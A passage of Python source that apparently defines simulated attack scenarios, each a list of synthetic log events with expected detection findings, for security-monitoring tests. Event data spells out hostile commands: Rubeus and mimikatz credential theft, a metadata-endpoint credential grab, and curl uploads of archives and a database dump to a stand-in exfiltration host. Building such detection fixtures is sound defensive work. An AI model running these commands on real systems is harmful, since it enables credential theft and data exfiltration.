        AttackEvent(event_type="login", delay=_delay(1200, 360, 720, 2160), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "return_session": True}}, requires_success=False),
        # Re-use the certificate to obtain a fresh TGT as administrator
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "Rubeus.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pass /ptt /nowrap", "path": "C:\\Users\\Public\\Rubeus.exe", "pid": 4208, "integrity_level": "medium", "hash": "c5d4e3f2a1b098765432fedcba876543210fedcba987654321fedcba98765432", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "lateral_movement", "tool": "Rubeus", "pkinit_auth": True, "cert_reuse": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.02, 0.3), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 88, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "certificate", "bytes_sent": 4096, "bytes_received": 2048, "description": "Kerberos AS-REQ with PKINIT certificate pre-authentication for administrator — certificate reuse day 3"}, requires_success=True),

        # --- Phase 8: Lateral movement — use cert-derived tickets across servers ---
        # Attacker authenticates to a file server using the certificate
        AttackEvent(event_type="login", delay=_delay(10, 5, 2, 25), data={"success": True, "ip": "10.0.3.20", "geo": "Internal Network", "device_id": "SRV-FILE01", "known_device": False, "method": "Certificate", "app": "Kerberos", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "pkinit_auth": True, "impersonated_user": "administrator"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.3.20", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "kerberos", "bytes_sent": 512, "bytes_received": 4096, "description": "SMB session established to SRV-FILE01 using Kerberos ticket from certificate auth"}, requires_success=True),
        # Browse sensitive file shares on the file server
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "read", "path": "/Finance/Q4_2026_Revenue_Forecast.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Read confidential financial forecast from SRV-FILE01 finance share", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.5, 5), data={"action": "download", "path": "/Executive/Board_Deck_2026.pptx", "system": "network_share", "label": "confidential", "category": "executive", "description": "Downloaded board presentation from SRV-FILE01 executive share", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # Attacker authenticates to a database server
        AttackEvent(event_type="login", delay=_delay(8, 4, 2, 20), data={"success": True, "ip": "10.0.3.25", "geo": "Internal Network", "device_id": "SRV-DB01", "known_device": False, "method": "Certificate", "app": "Kerberos", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "pkinit_auth": True, "impersonated_user": "administrator"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.3.25", "destination_port": 1433, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "kerberos", "bytes_sent": 1024, "bytes_received": 8192, "description": "SQL Server connection to SRV-DB01 using Kerberos ticket from certificate auth"}, requires_success=True),

        # --- Phase 9: Data collection and exfiltration ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "SQL Server", "action": "query_execute", "resource_type": "database", "resource_id": "db_hr_records", "resource_name": "HR_Records", "success": True, "description": "Bulk SELECT executed against HR_Records database — 12,450 rows returned", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "SQL Server", "action": "query_execute", "resource_type": "database", "resource_id": "db_customer", "resource_name": "CustomerDB", "success": True, "description": "Bulk SELECT executed against CustomerDB — 48,200 rows exported to CSV", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 1.5, 0.5, 8), data={"process_name": "7z.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "7z.exe a -pP@ssw0rd! -mhe=on C:\\Users\\Public\\backup.7z C:\\Users\\Public\\export_hr.csv C:\\Users\\Public\\export_cust.csv", "path": "C:\\Program Files\\7-Zip\\7z.exe", "pid": 4680, "integrity_level": "high", "hash": "e7f6a5b4c3d2109876543fedcba876543fedcba21098765432fedcba21098765", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "exfiltration", "staging": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "administrator", "auth": "none", "bytes_sent": 8388608, "bytes_received": 1024, "description": "HTTPS upload to external IP — 8 MB outbound transfer of staged archive"}, requires_success=True),

        # --- Phase 10: Cleanup — attacker removes tools ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c del /q C:\\Users\\Public\\Certify.exe C:\\Users\\Public\\Rubeus.exe C:\\Users\\Public\\mimikatz.exe C:\\Users\\Public\\openssl.exe C:\\Users\\Public\\admin.pfx", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 4812, "integrity_level": "high", "hash": "d744cd99138558dcab0f895e3596a05efd8e33ceba2b031c2207583da9d2109a", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "cleanup": True}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.55,
    iocs=["Certify.exe", "Rubeus.exe", "mimikatz.exe", "CORP-CA01-CA", "CorpVPN"],
    expected_findings=[
        "Certify.exe enumeration of CAs and vulnerable templates",
        "Certificate requested with SAN mismatch — requester differs from SAN principal",
        "PKINIT certificate-based Kerberos authentication for administrator",
        "DCSync replication traffic from workstation — not a domain controller",
        "Certificate reused for lateral movement to file and database servers",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo", "victim_ip", "victim_username"],
)

LOCAL_ADMIN_REUSE_LATERAL = AttackScenario(
    id="local_admin_reuse_lateral",
    tier="T2",
    name="Local Admin Credential Reuse — Mass Lateral Movement",
    description="Attacker reuses shared local admin hash across many machines via SMB pass-the-hash. Performs discovery commands on each hop, deploys beacon on final target, collects data, and establishes C2 for persistent access.",
    attack_type="lateral_movement",
    events=[
        # Phase 1: Initial access
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: Credential dump — extract local admin hash
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 9100, "integrity_level": "high", "command_line": "mimikatz.exe -ma lsass.exe C:\\Windows\\Temp\\creds.dmp", "hash": "09a0552581a64ee6f938957bb847b3166b5e8b5ba1b7da457885c41a113c991e", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        # Phase 3: Hop 1 — WKSTN-101
        AttackEvent(event_type="login", delay=_delay(10, 5, 2, 30), data={"success": True, "ip": "10.0.5.101", "geo": "Internal Network", "device_id": "WKSTN-101", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 9180, "integrity_level": "high", "command_line": "cmd.exe /c whoami & hostname & net localgroup administrators", "hash": "e077d3fec58a0f025fe254b5232cb79a19a23c4f6e7652afec23eecb61cbd9b8", "user_context": "WKSTN-101\\Administrator", "metadata": {"attack_phase": "discovery", "remote_exec": True, "target_host": "WKSTN-101"}}, requires_success=True),
        # Phase 4: Hop 2 — WKSTN-102
        AttackEvent(event_type="login", delay=_delay(5, 3, 1, 15), data={"success": True, "ip": "10.0.5.102", "geo": "Internal Network", "device_id": "WKSTN-102", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 9240, "integrity_level": "high", "command_line": "cmd.exe /c systeminfo & net share", "hash": "e077d3fec58a0f025fe254b5232cb79a19a23c4f6e7652afec23eecb61cbd9b8", "user_context": "WKSTN-102\\Administrator", "metadata": {"attack_phase": "discovery", "remote_exec": True, "target_host": "WKSTN-102"}}, requires_success=True),
        # Phase 5: Hop 3 — SRV-BUILD-01 (final target)
        AttackEvent(event_type="login", delay=_delay(5, 3, 1, 15), data={"success": True, "ip": "10.0.7.11", "geo": "Internal Network", "device_id": "SRV-BUILD-01", "known_device": False, "method": "NTLM", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "final_target": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 9310, "integrity_level": "high", "command_line": "cmd.exe /c dir /s /b C:\\BuildArtifacts\\*.zip C:\\BuildArtifacts\\*.key", "hash": "e077d3fec58a0f025fe254b5232cb79a19a23c4f6e7652afec23eecb61cbd9b8", "user_context": "SRV-BUILD-01\\Administrator", "metadata": {"attack_phase": "collection", "remote_exec": True, "target_host": "SRV-BUILD-01"}}, requires_success=True),
        # Phase 6: Data collection on final target
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "read", "path": "C:\\BuildArtifacts\\signing_keys\\", "system": "local", "description": "Collected code signing keys from build server", "metadata": {"attack_phase": "collection", "target_host": "SRV-BUILD-01"}}, requires_success=True),
        # Phase 7: Beacon deployment on final target
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "cmd.exe", "action": "start", "parent_process": "services.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 9380, "integrity_level": "high", "command_line": "beacon.exe", "hash": "58ab0d718af4d1d9cdb614b0cfd4255b9c8c3ec7b352218413c42616495b1895", "user_context": "SRV-BUILD-01\\Administrator", "metadata": {"attack_phase": "persistence", "payload_deployment": True}}, requires_success=True),
        # Phase 8: C2 network indicator from beacon
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "10.0.7.11", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 2048, "description": "C2 beacon from deployed payload on SRV-BUILD-01", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
    ],
    parameters=_AD_BASE_PARAMS,
    success_rate=0.65,
    iocs=["mimikatz.exe"],
    expected_findings=["Credential dump on initial host", "NTLM to 3+ hosts in rapid succession", "Same local admin across machines", "Beacon deployed on final target"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)



# =============================================================================
# CLOUD / SAAS SCENARIOS
# =============================================================================

_CLOUD_BASE_PARAMS = {
    "attacker_domains": ["noreply.com"], "sender_names": ["System"], "sender_prefixes": ["noreply"],
    **SHARED_ATTACKER_INFRA,
}

CLOUD_SERVICE_DISCOVERY = AttackScenario(
    id="cloud_service_discovery",
    tier="T2",
    name="Cloud Service Discovery / Enumeration",
    description="After gaining cloud access, attacker performs a broad resource sweep across subscriptions, storage, IAM, databases, networking, and containers, then drills into high-value targets to map permissions and data.",
    attack_type="cloud_recon",
    events=[
        # Phase 1: Initial access
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: Broad enumeration — sweep all resource types
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 5), data={"app": "Azure Portal", "action": "list_subscriptions", "usage": "read", "resource_type": "subscription", "resource_name": "all-subscriptions", "success": True, "description": "Enumerated cloud subscriptions and resource groups", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Portal", "action": "enumerate_storage_accounts", "usage": "read", "resource_type": "storage", "resource_name": "all-storage-accounts", "success": True, "description": "Listed all storage accounts across subscriptions", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "IAM Console", "action": "list_iam_roles", "usage": "read", "resource_type": "iam", "resource_name": "all-roles", "success": True, "description": "Enumerated IAM roles and attached policies", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "RDS Console", "action": "enumerate_databases", "usage": "read", "resource_type": "database", "resource_name": "all-rds-instances", "success": True, "description": "Listed database instances and their endpoints", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Lambda Console", "action": "list_serverless_functions", "usage": "read", "resource_type": "compute", "resource_name": "all-lambda-functions", "success": True, "description": "Enumerated serverless functions and their execution roles", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "VPC Console", "action": "describe_vpcs", "usage": "read", "resource_type": "networking", "resource_name": "all-vpcs", "success": True, "description": "Enumerated VPCs, subnets, and security groups", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "ECR Console", "action": "list_repositories", "usage": "read", "resource_type": "container", "resource_name": "all-ecr-repos", "success": True, "description": "Listed container image repositories", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "EKS Console", "action": "list_clusters", "usage": "read", "resource_type": "container", "resource_name": "all-eks-clusters", "success": True, "description": "Enumerated Kubernetes clusters and node groups", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 3: Drill-down — inspect high-value targets
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "IAM Console", "action": "get_role_policy", "usage": "read", "resource_type": "iam", "resource_name": "prod-admin-role", "success": True, "description": "Inspected policy document for production admin role", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "S3 Console", "action": "get_bucket_acl", "usage": "read", "resource_type": "storage", "resource_name": "corp-sensitive-data-bucket", "success": True, "description": "Checked access permissions on sensitive data bucket", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "S3 Console", "action": "list_objects", "usage": "read", "resource_type": "storage", "resource_name": "corp-sensitive-data-bucket", "success": True, "description": "Enumerated objects in sensitive data bucket", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "Azure Key Vault", "action": "list_key_vaults", "usage": "read", "resource_type": "key_vault", "resource_name": "all-key-vaults", "success": True, "description": "Discovered key vaults and their access policies", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.85,
    iocs=[],
    expected_findings=["Login from suspicious geo", "Sequential cloud resource enumeration across multiple services", "Sensitive bucket contents listed"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

CLOUD_ADMIN_COMMAND_ABUSE = AttackScenario(
    id="cloud_admin_command_abuse",
    tier="T2",
    name="Cloud Admin Run-Command Abuse",
    description="Attacker with compromised cloud admin credentials enumerates EC2 instances and their SSM agent status to find targets. Uses AWS Systems Manager RunCommand to execute reconnaissance, credential harvesting, and data exfiltration commands on production VMs without SSH/RDP. Hits multiple instances, dumps instance metadata credentials, exfiltrates sensitive files, and modifies security groups for persistent backdoor access.",
    attack_type="cloud_execution",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Enumerate instances and SSM targets ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "AWS EC2 Console", "action": "describe_instances", "resource_type": "instance", "resource_name": "All Instances", "success": True, "description": "Enumerated EC2 instances — identified prod-web-server-01, prod-web-server-02, prod-db-01", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS Systems Manager", "action": "describe_instance_information", "resource_type": "managed_instance", "resource_name": "SSM Managed Instances", "success": True, "description": "Checked SSM agent status — 3 production instances are SSM-managed and online", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Recon on first target via RunCommand ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 40), data={"app": "AWS Systems Manager", "action": "send_command", "resource_type": "command", "resource_id": "cmd-0a1b2c3d4e5f", "resource_name": "prod-web-server-01", "success": True, "description": "RunCommand issued to prod-web-server-01 — system reconnaissance", "metadata": {"attack_phase": "execution", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"process_name": "bash", "action": "start", "parent_process": "amazon-ssm-agent", "command_line": "bash -c 'whoami; id; uname -a; cat /etc/hostname; ip addr show; ps aux'", "path": "/usr/bin/bash", "pid": 14820, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "discovery", "ssm_execution": True}}, requires_success=True),

        # --- Phase 4: Credential harvesting from instance metadata ---
        AttackEvent(event_type="app_event", delay=_delay(20, 10, 5, 60), data={"app": "AWS Systems Manager", "action": "send_command", "resource_type": "command", "resource_id": "cmd-1b2c3d4e5f6a", "resource_name": "prod-web-server-01", "success": True, "description": "RunCommand issued to prod-web-server-01 — credential and secrets dump", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"process_name": "bash", "action": "start", "parent_process": "amazon-ssm-agent", "command_line": "bash -c 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && cat /etc/passwd && env | grep -i key'", "path": "/usr/bin/bash", "pid": 14856, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "credential_access", "ssm_execution": True, "imds_query": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(1, 0.5, 0.2, 3), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "root", "auth": "none", "bytes_sent": 8192, "bytes_received": 256, "description": "HTTPS POST from prod-web-server-01 — instance metadata credentials exfiltrated"}, requires_success=True),

        # --- Phase 5: Data exfil from first target ---
        AttackEvent(event_type="app_event", delay=_delay(25, 12, 5, 60), data={"app": "AWS Systems Manager", "action": "send_command", "resource_type": "command", "resource_id": "cmd-2c3d4e5f6a7b", "resource_name": "prod-web-server-01", "success": True, "description": "RunCommand issued to prod-web-server-01 — sensitive file exfiltration", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"process_name": "bash", "action": "start", "parent_process": "amazon-ssm-agent", "command_line": "bash -c 'tar czf /tmp/app_config.tar.gz /etc/app/ /opt/app/config/ && curl -X POST https://cdn-static-assets.com/data -F file=@/tmp/app_config.tar.gz'", "path": "/usr/bin/bash", "pid": 14912, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "exfiltration", "ssm_execution": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "root", "auth": "none", "bytes_sent": 524288, "bytes_received": 1024, "description": "HTTPS upload from prod-web-server-01 — 512 KB application config and secrets archive exfiltrated"}, requires_success=True),

        # --- Phase 6: Pivot to second VM ---
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "AWS Systems Manager", "action": "send_command", "resource_type": "command", "resource_id": "cmd-3d4e5f6a7b8c", "resource_name": "prod-db-01", "success": True, "description": "RunCommand issued to prod-db-01 — database credential dump", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"process_name": "bash", "action": "start", "parent_process": "amazon-ssm-agent", "command_line": "bash -c 'cat /opt/app/.env && pg_dump -U app_admin -h localhost customer_db | gzip | curl -X POST https://cdn-static-assets.com/data -F file=@-'", "path": "/usr/bin/bash", "pid": 8204, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "collection", "ssm_execution": True, "database_dump": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "root", "auth": "none", "bytes_sent": 52428800, "bytes_received": 2048, "description": "HTTPS upload from prod-db-01 — 50 MB compressed database dump exfiltrated"}, requires_success=True),

        # --- Phase 7: Persistence — open backdoor port ---
        AttackEvent(event_type="app_event", delay=_delay(20, 10, 5, 45), data={"app": "AWS EC2 Console", "action": "modify_security_group", "resource_type": "security_group", "resource_id": "sg-0abc123def456", "resource_name": "prod-web-sg", "success": True, "description": "Security group modified — inbound TCP port 4444 opened from 0.0.0.0/0", "metadata": {"attack_phase": "persistence", "is_attacker": True, "backdoor_port": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.7,
    iocs=["cdn-static-assets.com"],
    expected_findings=[
        "Console login from foreign IP with cloud admin credentials",
        "RunCommand used to execute commands on production servers",
        "IMDS queried for IAM credentials — credential theft from VM",
        "Database dump exfiltrated from production server",
        "Security group modified — inbound port opened as backdoor",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

OBJECT_STORAGE_MASS_READ = AttackScenario(
    id="object_storage_mass_read",
    tier="T2",
    name="Object Storage Mass Download",
    description="Attacker with compromised cloud credentials enumerates S3 buckets, checks ACLs and bucket policies to identify accessible storage, lists objects in multiple buckets, downloads files from multiple paths using built-in sync/copy tools, stages data locally, and exfiltrates over HTTPS with a large transfer indicator.",
    attack_type="data_exfiltration",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Bucket enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 10), data={"app": "AWS S3 Console", "action": "list_buckets", "success": True, "description": "Enumerated all S3 buckets — identified corp-documents, corp-financial-data, corp-hr-records", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: ACL and policy checks ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "AWS S3 Console", "action": "get_bucket_acl", "resource_name": "corp-documents", "success": True, "description": "Retrieved ACL for corp-documents bucket — full access confirmed", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 5), data={"app": "AWS S3 Console", "action": "get_bucket_policy", "resource_name": "corp-financial-data", "success": True, "description": "Retrieved bucket policy for corp-financial-data — no IP restrictions", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 5), data={"app": "AWS S3 Console", "action": "get_bucket_acl", "resource_name": "corp-hr-records", "success": True, "description": "Retrieved ACL for corp-hr-records bucket", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: List objects in multiple buckets ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "AWS S3 Console", "action": "list_objects", "resource_name": "corp-documents/*", "success": True, "description": "Listed 3,200 objects in corp-documents bucket", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "AWS S3 Console", "action": "list_objects", "resource_name": "corp-financial-data/*", "success": True, "description": "Listed 890 objects in corp-financial-data bucket", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 5: Mass download from multiple paths ---
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 15), data={"action": "download", "path": "/cloud-storage/corp-documents", "system": "s3", "description": "Mass download from corp-documents bucket via aws s3 sync", "metadata": {"attack_phase": "collection", "is_bulk": True, "is_attacker": True}}, requires_success=True, pre_attempts={"count_range": [50, 200], "delay": _delay(0.05, 0.02, 0.01, 0.2), "data_overrides": {"description": "Single object download from corp-documents bucket"}}),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/cloud-storage/corp-financial-data/reports/", "system": "s3", "description": "Downloaded financial reports from corp-financial-data bucket", "metadata": {"attack_phase": "collection", "is_bulk": True, "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/cloud-storage/corp-hr-records/employee-exports/", "system": "s3", "label": "confidential", "category": "pii", "description": "Downloaded employee data exports from HR records bucket", "metadata": {"attack_phase": "collection", "is_bulk": True, "is_attacker": True}}, requires_success=True),
        # --- Phase 6: Data staging ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS CLI", "action": "s3_sync_local", "resource_name": "/tmp/exfil-staging/", "success": True, "description": "Downloaded objects staged to local directory — 2.1 GB total", "metadata": {"attack_phase": "staging", "is_attacker": True}}, requires_success=True),
        # --- Phase 7: Network indicator with large transfer ---
        AttackEvent(event_type="network_event", delay=_delay(1, 0.5, 0.2, 5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "bytes_sent": 2254857830, "bytes_received": 4096, "description": "Large outbound HTTPS transfer — 2.1 GB of S3 data exfiltrated across 3 buckets", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.8,
    iocs=[],
    expected_findings=["Bucket enumeration from foreign IP", "Object listing across multiple storage buckets", "Mass download from corp-documents", "Large outbound data transfer to external IP"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

SECRET_VAULT_THEFT = AttackScenario(
    id="secret_vault_theft",
    tier="T2",
    name="Cloud Secret Vault / Key Manager Theft",
    description="Attacker enumerates available key vaults and access policies, reads high-value secrets (database passwords, API keys, certificates), then pivots to production resources using stolen credentials.",
    attack_type="credential_access",
    events=[
        # Phase 1: Initial access
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: Discovery — enumerate vault infrastructure
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Portal", "action": "list_key_vaults", "usage": "read", "resource_type": "key_vault", "resource_name": "subscription-vaults", "success": True, "description": "Enumerated all Key Vaults in subscription", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "Azure Key Vault", "action": "get_vault_access_policies", "usage": "read", "resource_type": "key_vault", "resource_name": "corp-prod-keyvault", "success": True, "description": "Retrieved access policies for production vault", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
